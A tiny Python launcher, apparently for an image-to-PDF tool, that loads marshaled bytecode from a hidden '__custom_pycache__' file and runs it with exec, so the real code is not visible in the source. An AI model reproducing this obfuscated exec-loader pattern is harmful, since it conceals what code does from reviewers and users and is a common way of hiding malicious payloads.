
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToPdf_8b752a4ccad5464483ade4f45d1a83c4.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
